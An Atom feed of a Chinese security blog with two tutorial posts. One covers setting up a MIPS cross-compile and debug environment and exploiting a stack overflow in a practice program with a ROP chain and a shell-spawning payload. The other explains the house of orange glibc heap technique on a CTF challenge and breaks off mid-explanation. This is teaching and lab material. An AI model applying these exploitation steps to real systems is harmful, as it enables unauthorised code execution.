<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>The lair of C0yo7e</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-05-12T10:11:08.278Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>C0yo7e</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>mips编译环境配置与简单栈溢出</title>
    <link href="http://yoursite.com/2020/05/12/mips%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://yoursite.com/2020/05/12/mips编译环境配置与简单栈溢出/</id>
    <published>2020-05-12T10:00:33.000Z</published>
    <updated>2020-05-12T10:11:08.278Z</updated>
    
    <content type="html"><![CDATA[<h4 id="环境编译"><a href="#环境编译" class="headerlink" title="环境编译"></a>环境编译</h4><p>首先就是搭一下编译环境，（==最好选16的ubuntu==，我曾经觉得18的Ubuntu长得好看，然后在上面搭了一天的环境之后发现，并不能动态调试，然后重新在16里又再搭了一天）</p><h5 id="buildroot"><a href="#buildroot" class="headerlink" title="buildroot"></a>buildroot</h5><p>下载：<a href="https://buildroot.org/download" target="_blank" rel="noopener">buildroot</a></p><p>解压之后，configs里面有一个<code>qemu_mips32r2el_malta_defconfig</code>这样的配置，可以进去找找看有没有，我们回到主目录，直接<code>make qemu_mips32r2el_malta_defconfig</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">coyote@ubuntu:~/buildroot<span class="number">-2020.02</span><span class="number">.1</span>$ make qemu_mips32r2el_malta_defconfig</span><br><span class="line">coyote@ubuntu:~/buildroot<span class="number">-2020.02</span><span class="number">.1</span>$ make</span><br></pre></td></tr></table></figure><p>make qemu…那个命令就是配置相对应的环境，就不用手动<code>make menuconfig</code> 去设置了。</p><a id="more"></a><p>进入menuconfig界面之后选择第一项<code>Target Architecture</code>，改成<code>MIPS（little endian）</code>（默认编译小端程序），另外，选择<code>Toolchain</code>，将<code>Kernel Headers</code>的Linux版本改成自己主机的Linux版本（因为我们编译出的MIPS交叉工具是需要在我们的主机上运行的）</p><p>之后make就好了（过程可能会很漫长，耐心等吧<br>编译完成之后，在<code>buildroot/output/host/bin</code><br>下就有<code>mipsel-linux-gcc</code>了，我们就可以通过它编译了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/buildroot-2020.02.1/output/host/bin/mipsel-linux-gcc test.c -o test -static</span><br></pre></td></tr></table></figure><p>不过这样还是有点麻烦，所以我们可以直接配置环境变量</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gedit ~/.bashrc</span><br><span class="line">export PATH=$PATH:/home/coyote/buildroot<span class="number">-2020.02</span><span class="number">.1</span>/output/host/usr/bin   <span class="comment">#写入文件</span></span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><p>然后我们就可以直接通过命令编译,不用带上路径了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mipsel-linux-gcc test.c -o test -static</span><br></pre></td></tr></table></figure><h5 id="IDA-mipsrop"><a href="#IDA-mipsrop" class="headerlink" title="IDA mipsrop"></a>IDA mipsrop</h5><p>下载 <a href="https://github.com/devttys0/ida/blob/master/plugins/mipsrop/mipsrop.py" target="_blank" rel="noopener">mipsrop.py</a></p><p>直接放到plugins下,然后重启就可以在ida的search里面找到<code>mips rop gadgets</code></p><p>点击这个之后，可以在idapython框里面输入mipsrop的命令，主要如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mipsrop.stackfinder() <span class="comment"># 寻找栈数据可控的 rop，建立和 a0、a1 寄存器的关系</span></span><br><span class="line">mipsrop.summary() <span class="comment"># 列出所有的可用 rop</span></span><br><span class="line">mipsrop.system() <span class="comment"># 寻找命令执行的的rop</span></span><br><span class="line">mipsrop.find(xxx) <span class="comment"># 查找 find 函数参数的 rop，类似正则匹配</span></span><br></pre></td></tr></table></figure><h4 id="mips的指令集特点"><a href="#mips的指令集特点" class="headerlink" title="mips的指令集特点"></a>mips的指令集特点</h4><p>主要的两个概念</p><ul><li>叶子函数：当前函数不再调用其他函数。</li><li>非叶子函数：当前函数调用其他函数。</li></ul><p>指令特点：</p><ul><li>固定4字节指令长度。</li><li>MIPS默认不把子函数的返回地址存放到栈中，而是存放到$ra寄存器中。</li><li>流水线效应。MIPS采用了高度的流水线，最重要的两个效应就是分支延迟效应和载入延迟效应。</li><li>没有堆栈直接操作的指令，也就是没有 push 和 pop 指令</li></ul><p>具体可以参考：</p><ul><li><a href="https://ray-cp.github.io/archivers/MIPS_Debug_Environment_and_Stack_Overflow#mips-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80" target="_blank" rel="noopener">mips的汇编基础</a></li><li><a href="https://blog.csdn.net/gujing001/article/details/8476685" target="_blank" rel="noopener">mips的指令和用法</a></li></ul><h4 id="mips的溢出"><a href="#mips的溢出" class="headerlink" title="mips的溢出"></a>mips的溢出</h4><h5 id="rop链"><a href="#rop链" class="headerlink" title="rop链"></a>rop链</h5><p>用了全网都在用的那个例子，也是《揭秘家用路由器0day漏洞挖掘技术》里面的例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_system_0</span><span class="params">(<span class="keyword">int</span> code,<span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">255</span>];</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> fileLen = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fileData</span>;</span></span><br><span class="line">    FILE *fp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> == stat(<span class="string">"passwd"</span>,&amp;fileData))</span><br><span class="line">        fileLen = fileData.st_size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((fp = fopen(<span class="string">"passwd"</span>,<span class="string">"rb"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Cannot open file passwd!n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ch=fgetc(fp);</span><br><span class="line">    <span class="keyword">while</span>(count &lt;= fileLen)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[count++] = ch;</span><br><span class="line">        ch = fgetc(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[--count] = 'x00';</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf,<span class="string">"adminpwd"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        do_system_0(count,<span class="string">"ls -l"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"you have an invalid password!n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译完之后，丢进ida看看程序是干什么的</p><p>会发现程序读入了一个passwd文件，然后passwd不对就会输出”you have an invalid password!n”</p><p>我们要利用溢出来绕过这个</p><p>所以我们先往passwd里面填充大量字符</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">coyote@ubuntu:~<span class="regexp">/mips_test$ python -c "print 'a'*0x200" &gt; passwd</span></span><br></pre></td></tr></table></figure><p>起qemu，然后gdb连接</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#terminal 1</span></span><br><span class="line">coyote@ubuntu:~/mips_test$ qemu-mipsel -g <span class="number">1234</span> ./test  <span class="comment">#-g是开放远程连接，gdb调试，1234是开放的端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#terminal 2</span></span><br><span class="line">coyote@ubuntu:~/mips_test$ gdb-multiarch ./test</span><br><span class="line">pwndbg&gt; target remote :<span class="number">1234</span> attach</span><br><span class="line"><span class="comment"># 如果第一次远程调的话，先</span></span><br><span class="line"><span class="comment"># pwndbg&gt;set arch mips</span></span><br><span class="line"><span class="comment"># pwndbg&gt;set endian little</span></span><br></pre></td></tr></table></figure><h6 id="gdb的调试分析过程："><a href="#gdb的调试分析过程：" class="headerlink" title="gdb的调试分析过程："></a>gdb的调试分析过程：</h6><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; target remote :<span class="number">1234</span> attach</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x61616161 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> V0   <span class="number">0x0</span></span><br><span class="line"> V1   <span class="number">0x1</span></span><br><span class="line"> A0   <span class="number">0x1</span></span><br><span class="line"> A1   <span class="number">0x1</span></span><br><span class="line"> A2   <span class="number">0x4b</span></span><br><span class="line"> A3   <span class="number">0x39</span></span><br><span class="line"> T0   <span class="number">0x0</span></span><br><span class="line"> T1   <span class="number">0x2a7f6573</span></span><br><span class="line"> T2   <span class="number">0xffffffff</span></span><br><span class="line"> T3   <span class="number">0x64726f77</span> (<span class="string">'word'</span>)</span><br><span class="line"> T4   <span class="number">0x0</span></span><br><span class="line"> T5   <span class="number">0x0</span></span><br><span class="line"> T6   <span class="number">0x0</span></span><br><span class="line"> T7   <span class="number">0x0</span></span><br><span class="line"> T8   <span class="number">0x1e</span></span><br><span class="line"> T9   <span class="number">0x40479c</span> (__pthread_return_0) ◂— jr     $ra</span><br><span class="line"> S0   <span class="number">0x0</span></span><br><span class="line"> S1   <span class="number">0x410000</span> (__preinit_array_start) ◂— <span class="number">0xffffffff</span></span><br><span class="line"> S2   <span class="number">0x0</span></span><br><span class="line"> S3   <span class="number">0x0</span></span><br><span class="line"> S4   <span class="number">0x0</span></span><br><span class="line"> S5   <span class="number">0x0</span></span><br><span class="line"> S6   <span class="number">0x0</span></span><br><span class="line"> S7   <span class="number">0x0</span></span><br><span class="line"> S8   <span class="number">0x61616161</span> (<span class="string">'aaaa'</span>)</span><br><span class="line"> FP   <span class="number">0x76ffec48</span> ◂— <span class="string">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n0'</span></span><br><span class="line"> SP   <span class="number">0x76ffec48</span> ◂— <span class="string">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n0'</span></span><br><span class="line"> PC   <span class="number">0x61616161</span> (<span class="string">'aaaa'</span>)</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">Invalid address <span class="number">0x61616161</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ fp sp  <span class="number">0x76ffec48</span> ◂— <span class="string">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n0'</span></span><br><span class="line"><span class="meta">... </span>↓</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span> <span class="number">61616161</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>通过这里可以看到跳转地址被改为了<code>0x61616161</code>，而存放这个内容的地址是<code>0x76ffec48</code>,所以计算从开始读入passwd文件的位置到跳转地址的字符偏移。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x76ffea00</span></span><br><span class="line"><span class="number">0x76ffea00</span>:<span class="number">0x00402744004105f4</span><span class="number">0x0000000076ffea7c</span></span><br><span class="line"><span class="number">0x76ffea10</span>:<span class="number">0x0000000000000000</span><span class="number">0x004011e0004181e0</span></span><br><span class="line"><span class="number">0x76ffea20</span>:<span class="number">0x004105f800413c80</span><span class="number">0x0000000000000002</span></span><br><span class="line"><span class="number">0x76ffea30</span>:<span class="number">0x0000000000413c80</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x76ffea40</span>:<span class="number">0x00400a3476ffea78</span><span class="number">0x00400ac000000000</span></span><br><span class="line"><span class="number">0x76ffea50</span>:<span class="number">0x00000000000001b6</span><span class="number">0x00000000004181e0</span></span><br><span class="line"><span class="number">0x76ffea60</span>:<span class="number">0x0041000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x76ffea70</span>:<span class="number">0x004006a000000000</span><span class="number">0x0040e76a00000000</span></span><br><span class="line"><span class="number">0x76ffea80</span>:<span class="number">0x0000000000001000</span><span class="number">0x00000000004181e0</span></span><br><span class="line"><span class="number">0x76ffea90</span>:<span class="number">0x00000201000000ff</span><span class="number">0x0041490800000201</span></span><br><span class="line"><span class="number">0x76ffeaa0</span>:<span class="number">0x0041490800414908</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffeab0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffeac0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffead0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffeae0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffeaf0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffeb00</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffeb10</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffeb20</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffeb30</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line">pwndbg&gt; distance <span class="number">0x76ffeaa8</span> <span class="number">0x76ffec48</span></span><br><span class="line">0x76ffeaa8-&gt;0x76ffec48 is 0x1a0 bytes (0x68 words)</span><br></pre></td></tr></table></figure><p>所以我们要填充<code>&#39;a&#39;*0x19c</code>使得跳转地址没有被覆盖</p><p>ida里通过mips rop找到可用的rop</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  <span class="number">0x004034A0</span>  |  addiu $a1,$sp,<span class="number">0x58</span>+var_40                           |  jr    <span class="number">0x58</span>+var_4($sp)                 |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">Found <span class="number">1</span> matching gadgets</span><br></pre></td></tr></table></figure><p><code>addiu $a1,$sp,0x58+var_40</code> –&gt; sp+0x18的位置放入参数(即’/bin/sh’)</p><blockquote><p>0x58+var_40 = 0x58-0x40 = 0x18</p></blockquote><p><code>jr    0x58+var_4($sp)</code> –&gt; 跳转执行sp+0x54位置的函数</p><blockquote><p>0x58+var_4($sp) = 0x58 - 0x4 = 0x54</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x $sp+<span class="number">24</span></span><br><span class="line">$<span class="number">2</span> = <span class="number">0x76ffec60</span></span><br><span class="line">pwndbg&gt; distance <span class="number">0x76ffec60</span> <span class="number">0x76ffeaa8</span></span><br><span class="line">0x76ffec60-&gt;0x76ffeaa8 is -0x1b8 bytes (-0x6e words)</span><br></pre></td></tr></table></figure><h6 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h6><p>其实之前的那个跳转地址就是我们的sp，所以我们再填充0x18个字节之后填入<code>&#39;/bin/sh/x00&#39;</code>作为system的参数，然后再填0x34个字节后，填入<code>do_system</code>的地址</p><h6 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">coyote@ubuntu:~/mips_test$ python -c <span class="string">"print 'a'*0x19c + '\xa0\x34\x40\x00' + 0x18*'b' + '/bin/sh\x00' + 'c'*0x34 + '\x70\x03\x40\x00'"</span> &gt; passwd</span><br><span class="line">coyote@ubuntu:~/mips_test$ qemu-mipsel ./test</span><br><span class="line">$ ls</span><br><span class="line">passwdtest  test_1  test.c</span><br></pre></td></tr></table></figure><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><ul><li><a href="https://www.jianshu.com/p/ba12cd4e530a" target="_blank" rel="noopener">https://www.jianshu.com/p/ba12cd4e530a</a></li><li><a href="https://ray-cp.github.io/archivers/MIPS_Debug_Environment_and_Stack_Overflow" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/MIPS_Debug_Environment_and_Stack_Overflow</a></li></ul><h5 id="书目推荐："><a href="#书目推荐：" class="headerlink" title="书目推荐："></a>书目推荐：</h5><ul><li>《揭秘家用路由器0day漏洞挖掘技术》<br>（<a href="https://raw.githubusercontent.com/ray-cp/MIPS/master/book_note/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF.pdf/" target="_blank" rel="noopener">pdf版</a>）</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;环境编译&quot;&gt;&lt;a href=&quot;#环境编译&quot; class=&quot;headerlink&quot; title=&quot;环境编译&quot;&gt;&lt;/a&gt;环境编译&lt;/h4&gt;&lt;p&gt;首先就是搭一下编译环境，（==最好选16的ubuntu==，我曾经觉得18的Ubuntu长得好看，然后在上面搭了一天的环境之后发现，并不能动态调试，然后重新在16里又再搭了一天）&lt;/p&gt;
&lt;h5 id=&quot;buildroot&quot;&gt;&lt;a href=&quot;#buildroot&quot; class=&quot;headerlink&quot; title=&quot;buildroot&quot;&gt;&lt;/a&gt;buildroot&lt;/h5&gt;&lt;p&gt;下载：&lt;a href=&quot;https://buildroot.org/download&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buildroot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;解压之后，configs里面有一个&lt;code&gt;qemu_mips32r2el_malta_defconfig&lt;/code&gt;这样的配置，可以进去找找看有没有，我们回到主目录，直接&lt;code&gt;make qemu_mips32r2el_malta_defconfig&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;coyote@ubuntu:~/buildroot&lt;span class=&quot;number&quot;&gt;-2020.02&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1&lt;/span&gt;$ make qemu_mips32r2el_malta_defconfig&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;coyote@ubuntu:~/buildroot&lt;span class=&quot;number&quot;&gt;-2020.02&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1&lt;/span&gt;$ make&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;make qemu…那个命令就是配置相对应的环境，就不用手动&lt;code&gt;make menuconfig&lt;/code&gt; 去设置了。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>house_of_orange</title>
    <link href="http://yoursite.com/2020/03/10/house-of-orange/"/>
    <id>http://yoursite.com/2020/03/10/house-of-orange/</id>
    <published>2020-03-10T03:44:04.000Z</published>
    <updated>2020-03-10T06:28:10.167Z</updated>
    
    <content type="html"><![CDATA[<p>其实之前从来没碰到house of orange的题，然后在想学io_file的时候看到有提到这个，就去了解了一下house of orange的原理。</p><h3 id="对于house-of-orange操作的理解（glibc2-23）"><a href="#对于house-of-orange操作的理解（glibc2-23）" class="headerlink" title="对于house of orange操作的理解（glibc2.23）"></a>对于house of orange操作的理解（glibc2.23）</h3><p>大体上是，没有<font color="red">free</font>函数，通过<font color="red">改写top chunk</font>，使top chunk的大小不能满足我们要malloc的大小，则malloc后，原来的top chunk会被释放，并置入到unsorted bin的队列。这样就可以到达不通过free也能把chunk写到unsorted bin的队列里面的目的了。</p><a id="more"></a><p>在<code>_int_malloc</code>函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，如果都不符合，接下来_int_malloc函数会试图使用 top chunk。</p><p>如果top chunk也无法满足的话，会执行以下的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则需要执行 <code>sysmalloc</code>来向系统申请更多的空间。</p><p>但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展（就是malloc的size要小于mmap的size），之后原有的 top chunk 会被置于 unsorted bin 中。</p><p>在 sysmalloc 函数中存在对 top chunk size 的 check，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">     ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      prev_inuse(old_top) &amp;&amp;</span><br><span class="line">      ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>这里是对top chunk 的合法性的检查。</p><p>想要伪造 ++top chunk++，就要满足以下几点：</p><blockquote><ul><li>伪造的 size 必须要对齐到内存页</li><li>size 要大于 MINSIZE(0x10)</li><li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li><li>size 的 prev inuse 位必须为 1</li></ul></blockquote><p><font color="red">fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size。</font></p><p>这里用houseoforange这个题来操作一下吧</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>这题没有free操作，让人很容易联想得到house_of_orange的操作，upgrade对写入的size没有检查，可以直接溢出。</p><p>它结合了house of orange、unsorted bin attack 和FSOP的知识点</p><blockquote><p><code>house of orange</code>使在没有free的条件下改写topchunk，下一次malloc一个大于topchunk的size则可以将它写进unsorted bin的队列了</p><p><code>unsorted bin attack</code>，通过malloc large bin（&gt;=512)，可以达到同时leak libc和heap的效果。随后再利用upgrade溢出，构造new 